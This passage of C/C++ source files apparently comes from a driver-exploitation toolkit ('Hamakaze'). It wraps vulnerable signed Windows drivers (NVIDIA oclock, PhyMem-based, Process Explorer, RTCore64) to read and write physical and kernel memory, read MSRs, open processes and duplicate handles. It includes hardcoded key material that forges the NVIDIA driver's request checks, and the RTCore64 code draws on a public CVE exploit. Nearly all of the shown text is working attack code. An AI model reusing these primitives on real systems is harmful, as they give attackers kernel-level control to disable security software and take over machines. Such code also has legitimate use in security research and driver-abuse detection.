*/
VOID NvoEncryptRequest(
    _In_ PVOID Request,
    _In_ ULONG Size,
    _In_ PVOID EncryptedKey
)
{
    char key_value2[64]; 
    char key_value1[64]; 
    char result1[256];
    char result2[312];

    _strcpy_a(key_value1, "Dfasd0981=kFGdv'df,b;lsk"); //random bullshit go
    memset(&key_value1[25], 0, 39);
    _strcpy_a(key_value2, "kasjhf923uasdfkYYE-=~");
    memset(&key_value2[22], 0, 42);
    memset(result1, 0, sizeof(result1));
    memset(result2, 0, 256);
    whirlpool(Request, Size, &result1);
    RtlCopyMemory(&result1[64], key_value1, 64ui64);
    whirlpool(&result1, 128, &result2);
    RtlCopyMemory(&result2[64], key_value2, 64ui64);
    whirlpool(&result2, 128, EncryptedKey);
}

/*
* NvoReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI NvoReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    NVOCLOCK_REQUEST request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.FunctionId = NV_FUNCID_PHYS_READ;
    request.Size = NumberOfBytes;
    request.Destination = Buffer;
    request.Source = (PVOID)PhysicalAddress;
    
    NvoEncryptRequest(&request, 0x38, &request.EncryptKey);

    return supCallDriver(DeviceHandle,
        IOCTL_NVOCLOCK_DISPATCH,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* NvoWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI NvoWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    NVOCLOCK_REQUEST request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.FunctionId = NV_FUNCID_PHYS_WRITE;
    request.Size = NumberOfBytes;
    request.Destination = (PVOID)PhysicalAddress;
    request.Source = Buffer;

    NvoEncryptRequest(&request, 0x38, &request.EncryptKey);

    return supCallDriver(DeviceHandle,
        IOCTL_NVOCLOCK_DISPATCH,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

```

`Source/Hamakaze/idrv/nvidia.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       NVIDIA.H
*
*  VERSION:     1.34
*
*  DATE:        16 Sep 2023
*
*  NVidia drivers interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define NV_FUNCID_READ_CRX   0x0
#define NV_FUNCID_WRITE_CRX  0x1
#define NV_FUNCID_PHYS_READ  0x14
#define NV_FUNCID_PHYS_WRITE 0x15

#define FILE_DEVICE_NVOCLOCK  (DWORD)0x9C40

#define NVOCLOCK_DISPATCH     (DWORD)0x921

#define IOCTL_NVOCLOCK_DISPATCH  \
	CTL_CODE(FILE_DEVICE_NVOCLOCK, NVOCLOCK_DISPATCH, METHOD_BUFFERED, FILE_WRITE_ACCESS) //0x9C40A484

//
// Multipurpose structure, other defines are irrelevant, size is 0x138 and checked in handlers.
//
typedef struct _NVOCLOCK_REQUEST {
    ULONG FunctionId; //NV_FUNCID_*
    ULONG Size;
    PVOID Destination;
    PVOID Source;
    BYTE OutputBuffer[32];
    BYTE EncryptKey[64]; //encrypted message here
    BYTE Reserved0[192];
} NVOCLOCK_REQUEST, * PNVOCLOCK_REQUEST;

BOOL WINAPI NvoReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI NvoWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/phymem.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       PHYMEM.CPP
*
*  VERSION:     1.11
*
*  DATE:        19 Apr 2021
*
*  PhyMem based drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/phymem.h"

//
// Realtek/Supermicro I/O drivers are based on PhyMem open-source library "PhyMem" by "akui" dated back to 2009.
// It is very similar to MAPMEM.SYS Microsoft Windows NT 3.51 DDK example from 1993.
//

/*
* PhyMemMapMemory
*
* Purpose:
*
* Map physical memory.
*
*/
PVOID PhyMemMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes)
{
    PVOID pMapSection = NULL;
    PHYMEM_MEM request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.pvAddr = (PVOID)PhysicalAddress;
    request.dwSize = NumberOfBytes;

    if (supCallDriver(DeviceHandle,
        IOCTL_PHYMEM_MAP,
        &request,
        sizeof(request),
        (PVOID)&pMapSection,
        sizeof(PVOID)))
    {
        return pMapSection;
    }

    return NULL;
}

/*
* PhyMemUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID PhyMemUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ ULONG NumberOfBytes
)
{
    PHYMEM_MEM request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.pvAddr = SectionToUnmap;
    request.dwSize = NumberOfBytes;

    supCallDriver(DeviceHandle,
        IOCTL_PHYMEM_UNMAP,
        &request,
        sizeof(request),
        NULL,
        0);
}

/*
* PhyMemQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI PhyMemQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR PML4 = 0;
    UCHAR* pbLowStub1M;
    ULONG cbSize = 0x100000;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    do {

        pbLowStub1M = (UCHAR*)supHeapAlloc(cbSize);
        if (pbLowStub1M == NULL) {
            dwError = GetLastError();
            break;
        }

        for (ULONG_PTR i = 0; i < cbSize; i += PAGE_SIZE) {

            if (!PhyMemReadPhysicalMemory(DeviceHandle,
                i,
                RtlOffsetToPointer(pbLowStub1M, i),
                PAGE_SIZE))
            {
                dwError = GetLastError();
                break;
            }

        }

        if (dwError == ERROR_SUCCESS) {

            PML4 = supGetPML4FromLowStub1M((ULONG_PTR)pbLowStub1M);
            if (PML4)
                *Value = PML4;

        }

    } while (FALSE);

    if (pbLowStub1M)
        supHeapFree(pbLowStub1M);

    SetLastError(dwError);
    return (PML4 != 0);
}

/*
* PhyMemVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI PhyMemVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        PhyMemQueryPML4Value,
        PhyMemReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* PhyMemReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI PhyMemReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = PhyMemMapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes);

    if (mappedSection) {

        __try {

            if (DoWrite) {
                RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        PhyMemUnmapMemory(DeviceHandle,
            mappedSection,
            NumberOfBytes);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* PhyMemReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI PhyMemReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return PhyMemReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* PhyMemWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI PhyMemWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return PhyMemReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* GioWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory via PhyMem.
*
*/
BOOL WINAPI PhyMemWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = PhyMemVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = PhyMemReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* PhyMemReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory via PhyMem.
*
*/
BOOL WINAPI PhyMemReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = PhyMemVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = PhyMemReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

```

`Source/Hamakaze/idrv/phymem.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       PHYMEM.H
*
*  VERSION:     1.10
*
*  DATE:        02 Apr 2021
*
*  PhyMem based drivers interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// PhyMem driver interface definitions.
//
// Taken from PhyMem source.
//

#define	FILE_DEVICE_PHYMEM	(DWORD)0x8000

#define PHYMEM_MAP          (DWORD)0x800
#define PHYMEM_UNMAP        (DWORD)0x801

#define IOCTL_PHYMEM_MAP	\
	CTL_CODE(FILE_DEVICE_PHYMEM, PHYMEM_MAP,\
			 METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_PHYMEM_UNMAP	\
	CTL_CODE(FILE_DEVICE_PHYMEM, PHYMEM_UNMAP,\
			 METHOD_BUFFERED, FILE_ANY_ACCESS)


typedef struct tagPHYMEM_MEM {
	PVOID pvAddr;	//physical addr when mapping, virtual addr when unmapping
	ULONG dwSize;	//memory size to map or unmap
} PHYMEM_MEM, * PPHYMEM_MEM;

BOOL WINAPI PhyMemQueryPML4Value(
	_In_ HANDLE DeviceHandle,
	_Out_ ULONG_PTR* Value);

BOOL WINAPI PhyMemVirtualToPhysical(
	_In_ HANDLE DeviceHandle,
	_In_ ULONG_PTR VirtualAddress,
	_Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI PhyMemReadPhysicalMemory(
	_In_ HANDLE DeviceHandle,
	_In_ ULONG_PTR PhysicalAddress,
	_In_ PVOID Buffer,
	_In_ ULONG NumberOfBytes);

BOOL WINAPI PhyMemWritePhysicalMemory(
	_In_ HANDLE DeviceHandle,
	_In_ ULONG_PTR PhysicalAddress,
	_In_reads_bytes_(NumberOfBytes) PVOID Buffer,
	_In_ ULONG NumberOfBytes);

BOOL WINAPI PhyMemWriteKernelVirtualMemory(
	_In_ HANDLE DeviceHandle,
	_In_ ULONG_PTR Address,
	_Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
	_In_ ULONG NumberOfBytes);

BOOL WINAPI PhyMemReadKernelVirtualMemory(
	_In_ HANDLE DeviceHandle,
	_In_ ULONG_PTR Address,
	_Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
	_In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/procexp.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       PROCEXP.CPP
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Process Explorer driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/procexp.h"

HANDLE g_PexPhysicalMemorySection = NULL;

static KDU_VICTIM_PROVIDER g_ProcExpVictimSelf{
        (LPCWSTR)PROCEXP152,              // Device and driver name
        (LPCWSTR)PROCEXP1627_DESC,        // Description
        IDR_PROCEXP1627,                  // Resource id in drivers database
        KDU_VICTIM_PE1627,                // Victim id
        SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,     // Desired access flags used for acquiring victim handle
        KDU_VICTIM_FLAGS_NONE,            // Victim flags, target dependent
        VpCreateFromExistingCallback,     // Victim create callback
        VpReleaseCallbackStub,            // Victim release callback
        VpExecuteFromExistingCallback,    // Victim execute payload callback
        &g_ProcExpSig,                    // Victim dispatch bytes
        sizeof(g_ProcExpSig)              // Victim dispatch bytes size
};

#define PexpMapMemory(PhysicalAddress, NumberOfBytes, MapForWrite) \
    supMapPhysicalMemory(g_PexPhysicalMemorySection, PhysicalAddress, NumberOfBytes, MapForWrite)

#define PexpUnmapMemory(BaseAddress) supUnmapPhysicalMemory(BaseAddress)

/*
* PexpReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI PexpReadWritePhysicalMemory(
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    return supReadWritePhysicalMemory(g_PexPhysicalMemorySection,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        DoWrite);
}

/*
* PexReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI PexReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return PexpReadWritePhysicalMemory(PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* PexWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI PexWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return PexpReadWritePhysicalMemory(PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* PexQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI PexQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
    ULONG cbRead = 0x100000;

    UNREFERENCED_PARAMETER(DeviceHandle);

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)PexpMapMemory(0ULL,
        cbRead,
        FALSE);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        PexpUnmapMemory((PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* PexVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI PexVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        PexQueryPML4Value,
        PexReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* PexReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI PexReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    UNREFERENCED_PARAMETER(DeviceHandle);
    SetLastError(ERROR_SUCCESS);

    bResult = PexVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = PexpReadWritePhysicalMemory(physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* PexWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI PexWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    UNREFERENCED_PARAMETER(DeviceHandle);
    SetLastError(ERROR_SUCCESS);

    bResult = PexVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = PexpReadWritePhysicalMemory(physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* PexpDuplicateHandle
*
* Purpose:
*
* Duplicate handle via ProcExp driver request.
*
*/
BOOL PexpDuplicateHandle(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE SourceProcessId,
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options
)
{
    PEXP_DUPLICATE_HANDLE_REQUEST request;

    UNREFERENCED_PARAMETER(SourceProcessHandle);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(HandleAttributes);
    UNREFERENCED_PARAMETER(Options);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.UniqueProcessId = SourceProcessId;
    request.SourceHandle = SourceHandle;

    *TargetHandle = NULL;

    return supCallDriver(DeviceHandle,
        IOCTL_PROCEXP_DUPLICATE_HANDLE,
        &request,
        sizeof(request),
        TargetHandle,
        sizeof(PVOID));
}

/*
* PexOpenProcess
*
* Purpose:
*
* Open process handle via ProcExp driver request.
*
*/
BOOL WINAPI PexOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle
)
{
    UNREFERENCED_PARAMETER(DesiredAccess);

    *ProcessHandle = NULL;

    return supCallDriver(
        DeviceHandle,
        IOCTL_PROCEXP_OPEN_PROCESS,
        (PVOID)&ProcessId,
        sizeof(ProcessId),
        ProcessHandle,
        sizeof(PVOID));
}

/*
* PexRegisterDriver
*
* Purpose:
*
* Driver initialization routine.
*
*/
BOOL WINAPI PexRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    KDU_CONTEXT* context = (KDU_CONTEXT*)Param;

    if (context == NULL)
        return FALSE;

    context->Victim = &g_ProcExpVictimSelf;

    return supOpenPhysicalMemory(DeviceHandle,
        PexOpenProcess,
        PexpDuplicateHandle,
        &g_PexPhysicalMemorySection);
}

/*
* PexpUnregisterDriver
*
* Purpose:
*
* Free ProcExp driver related resources.
*
*/
BOOL WINAPI PexpUnregisterDriver(
    _In_ HANDLE DeviceHandle)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    if (g_PexPhysicalMemorySection) {
        NtClose(g_PexPhysicalMemorySection);
        g_PexPhysicalMemorySection = NULL;
    }

    return TRUE;
}

```

`Source/Hamakaze/idrv/procexp.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       PROCEXP.H
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Process Explorer driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Process Explorer interface.
//

#define PROCEXP_DEVICE_TYPE (DWORD)0x8335

#define PROCEXP_FUNC_OPEN_PROCESS (DWORD)0xF
#define PROCEXP_FUNC_DUP_HANDLE (DWORD)0x5

#define IOCTL_PROCEXP_OPEN_PROCESS               \
    CTL_CODE(PROCEXP_DEVICE_TYPE, PROCEXP_FUNC_OPEN_PROCESS, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_PROCEXP_DUPLICATE_HANDLE           \
    CTL_CODE(PROCEXP_DEVICE_TYPE, PROCEXP_FUNC_DUP_HANDLE, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _PEXP_DUPLICATE_HANDLE_REQUEST {
    HANDLE UniqueProcessId;
    ULONG_PTR Unused0;
    ULONG_PTR Unused1;
    HANDLE SourceHandle;
} PEXP_DUPLICATE_HANDLE_REQUEST, * PPEXP_DUPLICATE_HANDLE_REQUEST;

BOOL WINAPI PexRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

BOOL WINAPI PexpUnregisterDriver(
    _In_ HANDLE DeviceHandle);

BOOL WINAPI PexQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI PexVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI PexReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PexWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PexReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PexWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PexOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle);

```

`Source/Hamakaze/idrv/rtcore.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       RTCORE.CPP
*
*  VERSION:     1.11
*
*  DATE:        19 Apr 2021
*
*  RTCORE64 driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/rtcore.h"

//
// Based on https://github.com/Barakat/CVE-2019-16098
//

/*
* RTCoreCallDriver
*
* Purpose:
*
* Call RTCore driver.
*
*/
BOOL RTCoreCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID Buffer,
    _In_ ULONG Size)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        Buffer,
        Size,
        Buffer,
        Size);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* RTCoreReadMSR
*
* Purpose:
*
* Read given msr.
*
*/
BOOL WINAPI RTCoreReadMsr(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG Msr,
    _Out_ ULONG64* Value
)
{
    RTCORE_MSR request;

    *Value = 0;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Register = Msr;

    if (!RTCoreCallDriver(DeviceHandle,
        IOCTL_RTCORE_READMSR,
        &request,
        sizeof(request)))
    {
        return FALSE;
    }

    *Value = (request.ValueLow & 0xfffff000ul) | ((ULONG64)request.ValueHigh << 32);

    return TRUE;
}

/*
* RTCoreReadMemoryPrimitive
*
* Purpose:
*
* Basic read primitive, reads 4 bytes at once.
*
*/
BOOL RTCoreReadMemoryPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG Size,
    _In_ ULONG_PTR Address,
    _Out_ ULONG* Value)
{
    RTCORE_REQUEST request;

    *Value = 0;

    if ((Size != sizeof(WORD)) &&
        (Size != sizeof(ULONG)))
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Address = Address;
    request.Size = Size;

    if (RTCoreCallDriver(DeviceHandle,
        IOCTL_RTCORE_READVM,
        &request,
        sizeof(RTCORE_REQUEST)))
    {
        *Value = request.Value;
        return TRUE;
    }

    return FALSE;
}

/*
* RTCoreWriteMemoryPrimitive
*
* Purpose:
*
* Basic write primitive, writes 4 bytes at once.
*
*/
BOOL RTCoreWriteMemoryPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ DWORD Size,
    _In_ ULONG_PTR Address,
    _In_ ULONG Value)
{
    RTCORE_REQUEST request;

    if ((Size != sizeof(WORD)) &&
        (Size != sizeof(ULONG)))
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Address = Address;
    request.Size = Size;
    request.Value = Value;

    return RTCoreCallDriver(DeviceHandle,
        IOCTL_RTCORE_WRITEVM,
        &request,
        sizeof(RTCORE_REQUEST));
}

/*
* RTCoreReadMemoryULONG
*
* Purpose:
*
* Read ULONG from kernel.
*
*/
BOOL RTCoreReadMemoryULONG(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_ ULONG* Value)
{
    ULONG valueRead = 0;

    *Value = 0;

    if (RTCoreReadMemoryPrimitive(DeviceHandle,
        sizeof(ULONG),
        Address,
        &valueRead))
    {
        *Value = valueRead;
        return TRUE;
    }

    return FALSE;
}

/*
* RTCoreReadMemoryULONG64
*
* Purpose:
*
* Read ULONG64 from kernel.
*
*/
BOOL RTCoreReadMemoryULONG64(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_ ULONG64* Value)
{
    ULONG valueLow = 0, valueHigh = 0;

    *Value = 0;

    if (!RTCoreReadMemoryULONG(DeviceHandle,
        Address + sizeof(ULONG),
        &valueHigh))
    {
        return FALSE;
    }

    if (!RTCoreReadMemoryULONG(DeviceHandle,
        Address,
        &valueLow))
    {
        return FALSE;
    }

    *Value = ((ULONG64)valueHigh << 32) | valueLow;

    return TRUE;
}

/*
* RTCoreWriteMemoryULONG
*
* Purpose:
*
* Write ULONG to kernel.
*
*/
BOOL RTCoreWriteMemoryULONG(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ ULONG Value
)
{
    return RTCoreWriteMemoryPrimitive(DeviceHandle,
        sizeof(ULONG),
        Address,
        Value);
}

/*
